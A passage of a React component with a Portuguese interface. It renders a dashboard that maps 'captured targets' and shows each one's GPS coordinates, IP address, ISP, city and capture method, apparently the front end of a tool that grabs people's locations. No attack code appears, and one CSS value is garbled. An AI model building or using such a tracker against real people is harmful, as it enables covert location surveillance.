                zoomControl={true}
              >
                {/* Cyberpunk Map Tiles using CartoDB Dark Matter */}
                <TileLayer
                  attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>'
                  url="https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png"
                />
                
                {/* Center view helper */}
                <ChangeView center={currentCoords} zoom={mapZoom} />

                {/* Plot all captured targets */}
                {targets.map(target => (
                  <Marker 
                    key={target.id} 
                    position={target.coords} 
                    icon={targetIcon}
                    eventHandlers={{
                      click: () => {
                        setSelectedTarget(target);
                        addLog(`Selecionou alvo [${target.id}] via marcador do mapa.`, 'info');
                      }
                    }}
                  >
                    <Popup>
                      <div style={{ background: '#050811', color: '#fff', padding: '5px', fontSize: '0.8rem', fontFamily: 'monospace' }}>
                        <strong style={{ color: 'var(--neon-green)' }}>ALVO: {target.id}</strong><br/>
                        IP: {target.ip}<br/>
                        Cidade: {target.city}<br/>
                        Método: {target.method}
                      </div>
                    </Popup>
                  </Marker>
                ))}

                {/* Plot accuracy circle for selected target */}
                {selectedTarget && selectedTarget.method === 'GPS' && (
                  <Circle 
                    center={selectedTarget.coords}
                    radius={15} // 15 meters
                    pathOptions={{ 
                      color: 'var(--neon-green)', 
                      fillColor: 'var(--neon-green)', 
                      fillOpacity: 0.15,
                      weight: 1,
                      dashArray: '5, 5'
                    }}
                  />
                )}
              </MapContainer>

              {/* Grid overlay aesthetics */}
              <div style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                pointerEvents: 'none',
                border: '1px solid var(--border-glow)',
                boxShadow: 'inset 0 0 30px rgba(0,255,102,0.1)',
                zIndex: 2
              }}>
                {/* Corner crosshairs */}
                <div style={{ position: 'absolute', top: '10px', left: '10px', width: '15px', height: '15px', borderLeft: '2px solid var(--neon-green)', borderTop: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', top: '10px', right: '10px', width: '15px', height: '15px', borderRight: '2px solid var(--neon-green)', borderTop: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', bottom: '10px', left: '10px', width: '15px', height: '15px', borderLeft: '2px solid var(--neon-green)', borderBottom: '2px solid var(--neon-green)' }}></div>
                <div style={{ position: 'absolute', bottom: '10px', right: '10px', width: '15px', height: '15px', borderRight: '2px solid var(--neon-green)', borderBottom: '2px solid var(--neon-green)' }}></div>
              </div>
            </div>

            {/* Target Geodetic Telemetry Summary */}
            <div className="cyber-panel">
              <div className="cyber-title">
                <Compass size={18} />
                Módulo Geodésico & Telemetria do Alvo
              </div>

              {selectedTarget ? (
                <div style={{ 
                  display: 'grid', 
                  gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', 
                  gap: '15px', 
                  fontSize: '0.85rem' 
                }}>
                  
                  {/* Coords & Accuracy */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>COORDENADAS GEOGRÁFICAS</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-green)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.coords[0].toFixed(6)}, {selectedTarget.coords[1].toFixed(6)}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '5px' }}>
                      <Navigation size={12} />
                      Precisão: {selectedTarget.accuracy}
                    </div>
                  </div>

                  {/* Network details */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>ENDEREÇO IP & PROVEDOR</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: 'var(--neon-blue)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.ip}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '5px' }}>
                      <Wifi size={12} />
                      ISP: {selectedTarget.isp}
                    </div>
                  </div>

                  {/* Geographic Details */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>LOCALIZAÇÃO ESTIMADA</div>
                    <div style={{ fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.city}, {selectedTarget.region} - {selectedTarget.country}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                      Timestamp: {selectedTarget.timestamp}
                    </div>
                  </div>

                  {/* Tracking mechanism & Provider info */}
                  <div style={{ background: 'rgba(5, 8, 17, 0.5)', padding: '12px', border: '1px solid rgba(0, 255, 102, 0.1)', borderRadius: '4px' }}>
                    <div style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'var(--font-mono)' }}>MÉTODO & PROVEDOR DA API</div>
                    <div style={{ fontFamily: 'var(--font-mono)', color: selectedTarget.method === 'GPS' ? 'var(--neon-green)' : 'var(--neon-blue)', fontWeight: 'bold', margin: '4px 0', fontSize: '0.95rem' }}>
                      {selectedTarget.method === 'GPS' ? 'DISPOSITIVO GPS (ATALHO)' : 'BASEADO EM PROVEDOR IP'}
                    </div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
                      Fonte: {selectedTarget.provider}
                    </div>
                  </div>

                </div>
              ) : (
                <div style={{ textAlign: 'center', padding: '20px', color: 'var(--text-muted)', fontSize: '0.85rem' }}>
                  Aguardando captação de telemetria. Selecione um alvo ou simule um acesso para exibir os detalhes geodésicos.
                </div>
              )}
            </div>

          </div>

        </div>

      </main>
      
      {/* Bottom stats status bar */}
      <footer style={{
        background: '#050811',
        borderTop: '1px solid rgba(0,255,10 green,0.1)',
        padding: '5px 20px',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        fontFamily: 'var(--font-mono)',
        fontSize: '0.7rem',
        color: 'var(--text-muted)'
      }}>
        <div>STATUS: CONEXÃO SEGURA // SSL ATIVO</div>
        <div style={{ display: 'flex', gap: '20px' }}>
          <span>BANCO DE DADOS: {targets.length} REGISTROS</span>
          <span style={{ color: 'var(--neon-green)' }}>MONITOR: ATIVO</span>
        </div>
      </footer>
    </div>
  );
}
